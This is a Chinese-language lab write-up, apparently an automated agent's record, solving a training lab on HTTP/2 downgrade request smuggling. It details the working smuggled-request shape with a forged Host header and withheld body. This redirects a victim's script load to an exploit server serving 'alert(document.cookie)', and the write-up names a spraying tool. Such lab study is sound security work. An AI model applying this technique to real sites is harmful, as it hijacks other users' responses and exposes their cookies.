---
title: lab-request-smuggling-h2-cl-request-smuggling (A 臂实录)
---
# lab-request-smuggling-h2-cl-request-smuggling (A 臂实录)

- 终态: solved=true（banner_verdict congrats 行 + exploit server 日志里受害者 IP 三次 `GET /resources/`）。
- 题面: 前端把 h2 降级成 h1.1 且照抄客户端 content-length；目标是让受害者浏览器从 exploit server 加载并执行 JS（alert(document.cookie)）。
- 实例: range_launch launch-url 起实例；首页脚本链 `/resources/js/analyticsFetcher.js` → 5s 后 `/resources/js/analytics.js?uid=<random>`（随机 uid 让该响应永不复用缓存，受害者每次访问都发新请求）。
- 原语确认（h2_req）：`POST /` + `content-length: 0` + DATA(走私请求) 让后端连接多出一条响应；h2_burst 同连接第二条流拿到走私请求的响应（200→404）即证。
- 池共享鉴别：用「不完整走私请求」留下挂起状态（`X-Pad: ` 行吸收后继请求行），从新连接探测得 404/400 —— 证明前端到后端的连接跨客户端复用。
- 反向证据：完整走私请求留下的多余响应在连接入池时被前端丢弃（探针 0/6 泄漏），所以纯「响应队列投毒」跨连接不成立。
- 关键响应面：`/resources` 无尾斜杠返回 302，Location 由请求 Host 拼装成 `https://<Host>/resources/`；同路径 POST 同样 302。
- 折中形态（生效者）：走私请求 = `POST /resources` + `Host: <exploit-server>` + `Content-Length: 60`，且不发 body → 应用挂起等 body；受害者下一个请求的字节充当 body，应用随即回 302 指向 exploit server，前端把这条 302 交给受害者请求。
- 本地复验：同一形态下 10 次探针得 7 次 302，Location 全是 exploit host。
- 交付：exploit server 在 `/resources/` 存 head `HTTP/1.1 200 OK` + `application/javascript`、body `alert(document.cookie)`；持续喷洒约 60s 后受害者浏览器翻牌。
- 教训：Host 取的是块内最后一个 Host（受害者请求的 Host 会顶掉走私请求里的 Host），所以「吸收请求行」那类形态只能重定向到靶站自身；必须让应用的响应晚于受害者请求到达（body 挂起），响应才由走私请求自身的 Host 生成。
- 判据形态：这题要的是「请求状态投毒」（应用侧未完成请求吞掉受害者请求），不是「响应队列投毒」。
- 新件：`.pi-rs/rust-scripts/h2cl_spray.rs`（probe/spray 双模，arm 可持连接，报每次 status + location）。
